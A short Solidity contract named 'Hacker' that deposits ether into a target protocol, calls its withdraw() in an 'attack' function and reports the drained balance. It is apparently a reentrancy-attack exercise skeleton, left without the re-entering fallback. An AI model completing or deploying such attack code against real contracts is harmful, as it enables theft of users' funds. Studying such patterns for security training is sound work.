
pragma solidity 0.8.7;

contract Hacker {

    function protocolDeposit(address protocol) public payable {
        (bool success,) = protocol.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "call failed");
    }

    function attack(address protocol) public payable {
        (bool hacked,) = protocol.call(abi.encodeWithSignature("withdraw()"));
        require(hacked, "attack failed");
    }

    
    
    
    

    function rektMoney() public view returns(uint256) {
        return address(this).balance;
    }
}
